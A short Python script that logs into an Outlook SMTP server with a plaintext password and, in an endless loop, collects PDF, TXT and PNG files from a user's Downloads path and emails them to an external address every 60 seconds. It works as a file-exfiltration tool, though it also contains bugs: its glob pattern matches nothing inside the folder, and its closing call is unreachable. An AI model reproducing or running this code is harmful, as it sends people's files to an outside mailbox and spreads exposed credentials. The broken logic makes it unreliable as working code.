import os
import glob
import smtplib
import time
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email import encoders

# Email details
email_from = 'richardanderson9753@outlook.com'
email_to = 'richardanderson9753@outlook.com'
email_subject = 'Files in system'
email_body = 'Attached are the requested files.'

# File extensions to filter
extensions = ['pdf','txt','png']

# Connect to SMTP server
smtp_server = 'smtp.office365.com'
smtp_port = 587
smtp_username = 'richardanderson9753@outlook.com'
smtp_password = 'Richard@2023'
smtp_tls = True
server = smtplib.SMTP(smtp_server, smtp_port)
if smtp_tls:
    server.starttls()
server.login(smtp_username, smtp_password)

while True:
    # Get list of files with specified extensions
    files = []
    for ext in extensions:
        files.extend(glob.glob(f'/Users/saiya/Downloads.{ext}', recursive=True))

    # Send email with up to 3 files at a time
    while files:
        msg = MIMEMultipart()
        msg['From'] = email_from
        msg['To'] = email_to
        msg['Subject'] = email_subject
        msg.attach(MIMEText(email_body, 'plain'))

        for i in range(min(3, len(files))):
            file = files.pop(0)
            with open(file, 'rb') as f:
                part = MIMEBase('application', 'octet-stream')
                part.set_payload(f.read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', f'attachment; filename="{os.path.basename(file)}"')
            msg.attach(part)

        server.sendmail(email_from, email_to, msg.as_string())
        print('Email sent successfully')

    # Wait for 60 seconds before checking again
    time.sleep(60)

# Close SMTP connection
server.quit()